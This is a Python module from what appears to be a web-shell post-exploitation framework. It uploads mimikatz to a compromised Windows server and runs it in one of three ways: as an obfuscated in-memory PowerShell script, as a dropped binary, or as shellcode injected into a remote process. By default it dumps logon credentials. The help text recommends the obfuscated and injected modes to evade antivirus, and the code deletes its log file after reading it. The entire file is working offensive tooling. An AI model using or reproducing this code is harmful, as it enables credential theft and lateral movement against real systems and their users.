from core.Module import Module, ModuleException
from core import config
from modules.upload import Upload
from modules.exec_cmd import Exec_cmd
from modules.runas import Runas
from modules.invoke_ps_module import Invoke_ps_module
from modules.invoke_ps_module_as import Invoke_ps_module_as
from modules.inject_dll_srdi import Inject_dll_srdi
from utils.random_string import random_generator
import traceback
import os


class MimikatzModuleException(ModuleException):
    pass


class Mimikatz(Module):
    _exception_class = MimikatzModuleException
    short_help = "Run an offline version of mimikatz directly in memory"
    complete_help = r"""
        Authors:    @gentilkiwi @PowerShellMafia
        Links:      https://github.com/gentilkiwi/mimikatz
                    https://github.com/PowerShellMafia/PowerSploit/blob/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1
        Credits:    @phra
        
        
        This module allows you to run mimikatz in a versatile way.
        Within this module it is possible to run mimikatz in 3 different ways:
            'ps1': an obfuscated ps1 module will be uploaded to the server and get deobfuscated at runtime in memory;
            'exe': the classic mimikatz binary will be uploaded to the server and run with arguments;
            'dll': convert mimikatz dll into a position independent shellcode and inject into a remote process.
        It is recommended to run the ps1 version because it will be obfuscated and run from memory.
        The exe version will be just dropped as clear and could be catched by av scanners.
        The dll version is the most stealthy but it doesn't support impersonation atm.
        
            
        Usage:
            #mimikatz [exec_type] [username] [password] [domain] [custom_command]
        
        Positional arguments:
            exec_type               execution type for running mimikatz:
                                        'ps1' will upload and execute the powershell version of mimikatz
                                        'exe' will upload and execute the classic version of binary mimikatz
                                        'dll' will inject converted dll shellcode into a remote process
                                    Default: 'ps1'
            username                username of the user to runas the process
            password                password of the user to runas the process
            domain                  domain of the user to runas the process
            custom_command          based on exec_type, the custom command could be:
                                        - 'ps1' : powershell code to add to the ps1 mimikatz module;
                                        - 'exe' : command line arguments to the mimikatz binary;
                                        - 'dll' : command line arguments to be executed.
                                    Default:
                                        'ps1': ';Invoke-Mimikatz -DumpCreds'
                                        'exe': 'privilege::debug sekurlsa::logonpasswords exit'  
                                        'dll': 'privilege::debug sekurlsa::logonpasswords exit'  
        
        Examples:
            Run mimikatz as the current user
                #mimikatz
            Run mimikatz dll
                #mimikatz 'dll'
            Run mimikatz as a specific local user
                #mimikatz 'ps1' 'user1' 'password1'
            Run mimikatz as a specific domain user
                #mimikatz 'ps1' 'user1' 'password1' 'domain'
            Run exe version of mimikatz as the current user
                #mimikatz 'exe'
            Run exe version of mimikatz as a specific user
                #mimikatz 'exe' 'user1' 'password1'
            Run mimikatz with a custom command, i.e. dumping cert
                #mimikatz 'ps1' '' '' '' ';Invoke-Mimikatz -DumpCerts'
            Run mimikatz binary with a custom command, i.e. coffee :)
                #mimikatz 'exe' '' '' '' 'coffee exit'

    """

    __default_exec_type = 'ps1'
    __default_username = ''
    __default_password = ''
    __default_domain = ''
    __default_ps_command = ';Invoke-Mimikatz -DumpCreds'
    __default_exe_command = 'privilege::debug sekurlsa::logonpasswords exit'

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.upload_module_object = Upload(password, channel_enc_mode, module_settings, request_object)
        self.exec_cmd_module_object = Exec_cmd(password, channel_enc_mode, module_settings, request_object)
        self.runas_module_object = Runas(password, channel_enc_mode, module_settings, request_object)
        self.invoke_ps_module_object = Invoke_ps_module(password, channel_enc_mode, module_settings, request_object)
        self.invoke_ps_as_module_object = Invoke_ps_module_as(password, channel_enc_mode, module_settings, request_object)
        self.inject_dll_srdi_module_object = Inject_dll_srdi(password, channel_enc_mode, module_settings, request_object)

    def __parse_run_args(self, args):
        args_parser = {k: v for k, v in enumerate(args)}
        exec_type = args_parser.get(0, self.__default_exec_type)
        username = args_parser.get(1, self.__default_username)
        password = args_parser.get(2, self.__default_password)
        domain = args_parser.get(3, self.__default_domain)
        custom_command = args_parser.get(4, self.__default_exe_command if exec_type != 'ps1' else self.__default_ps_command)
        return exec_type, username, password, domain, custom_command

    def __lookup_exe_binary(self):
        if 'mimikatz.exe' in self._module_settings.keys():
            bin_path = self._module_settings['mimikatz.exe']
        else:
            exe_path = config.modules_paths + 'exe_modules' + os.sep + 'mimikatz.exe'
            remote_upload_path = self._module_settings['env_directory'] + '\\' + random_generator() + '.exe'
            print ('\n\n\nUploading mimikatz binary....\n')
            upload_response = self._parse_response(self.upload_module_object.run([exe_path, remote_upload_path]))
            print (upload_response)
            self._module_settings['mimikatz.exe'] = remote_upload_path
            bin_path = remote_upload_path
        return bin_path

    def __run_exe_version(self, username, password, domain, custom_command):
        remote_upload_path = self.__lookup_exe_binary()
        if username == '':
            response = self.exec_cmd_module_object.run(['""' + remote_upload_path + '""' + ' ' + custom_command])
        else:
            response = self.runas_module_object.run([remote_upload_path + ' ' + custom_command, username, password, domain])
        parsed_response = self._parse_response(response)
        return parsed_response

    def __run_dll_version(self, username, custom_command):
        dll_name = 'powerkatz.dll'
        exported_function_name = 'powershell_reflective_mimikatz'
        log_file = self._module_settings['env_directory'] + '\\' + random_generator()
        exported_function_data = str.encode('"log ' + log_file + '" ' + custom_command + '\x00', 'utf-16-le')
        if username == '':
            print ('\n\nInjecting converted DLL shellcode into remote process...')
            response = self.inject_dll_srdi_module_object.run([dll_name, 'remote_virtual', 'cmd.exe', '60000', '{}',
                                                                   exported_function_name, exported_function_data])
            response = self._parse_response(response)
            response += '\nDLL injection executed!\n\n\nOutput of mimikatz:\n\n'
            response += self._parse_response(self.exec_cmd_module_object.run(['type ' + log_file + ' & del /f /q ' + log_file]))
        else:
            raise self._exception_class('#mimikatz: exec_type "dll" does not support the runas function atm\n')
        parsed_response = self._parse_response(response)
        return parsed_response

    def __run_ps_version(self, username, password, domain, custom_command):
        if username == '':
            response = self.invoke_ps_module_object.run(['Invoke-Mimikatz.ps1', custom_command])
        else:
            response = self.invoke_ps_as_module_object.run(['Invoke-Mimikatz.ps1', username, password, custom_command, domain])
        parsed_response = self._parse_response(response)
        return parsed_response

    def run(self, args):
        try:
            exec_type, username, password, domain, custom_command = self.__parse_run_args(args)
            if exec_type == 'exe':
                response = self.__run_exe_version(username, password, domain, custom_command)
            elif exec_type == 'dll':
                response = self.__run_dll_version(username, custom_command)
            else:
                response = self.__run_ps_version(username, password, domain, custom_command)
            parsed_response = self._parse_response(response)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
